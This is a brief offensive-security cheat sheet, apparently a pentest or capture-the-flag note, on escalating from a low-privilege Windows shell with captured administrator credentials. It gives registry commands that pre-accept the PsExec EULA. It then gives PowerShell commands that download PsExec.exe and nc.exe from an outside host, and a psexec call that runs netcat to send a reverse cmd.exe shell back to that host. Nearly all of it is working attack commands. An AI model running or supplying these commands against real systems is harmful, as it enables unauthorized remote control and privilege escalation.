# PsExec.exe

If we have administrator credential at low priv shell. We can execute command with that credential.

```
Reg Query HKCU\Software\Sysinternals\PsExec\EulaAccepted #Should be 1

Reg Add HKCU\Software\Sysinternals\PsExec\EulaAccepted /v 1
Reg Query HKCU\Software\Sysinternals\PsExec\EulaAccepted

HKEY_CURRENT_USER\Software\Sysinternals\PsExec\EulaAccepted  1    REG_SZ
```

```
powershell -c "Invoke-WebRequest -Uri 'http://192.168.1.1/PsExec.exe' -OutFile psexec.exe"

powershell -c "Invoke-WebRequest -Uri 'http://192.168.1.1/nc.exe' -OutFile nc.exe"

.\psexec -u cel1s0 -p password nc.exe -e cmd.exe 192.168.1.1 80
```
